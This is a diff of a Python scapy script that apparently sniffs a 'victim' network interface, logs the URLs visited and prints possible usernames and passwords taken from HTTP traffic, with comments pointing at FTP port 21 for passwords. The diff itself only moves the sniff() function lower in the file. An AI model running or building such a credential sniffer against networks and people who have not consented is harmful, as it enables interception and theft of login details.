@@ -12,15 +12,6 @@ def get_arguments():
     return options.interface
 
 
-# sniff information of interface victim
-def sniff(interface):
-    # pip install scapy_http
-    # filter udp; arp; tcp
-    # port 21 to passwords tcp
-    # port 80 websites
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
-
-
 # function get url access
 def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
@@ -44,6 +35,14 @@ def process_sniffed_packet(packet):
         login_info = get_login_info(packet)
         if login_info:
             print("[+] Possible username/password" + str(login_info))
+            
+# sniff information of interface victim
+def sniff(interface):
+    # pip install scapy_http
+    # filter udp; arp; tcp
+    # port 21 to passwords tcp
+    # port 80 websites
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
 # main function
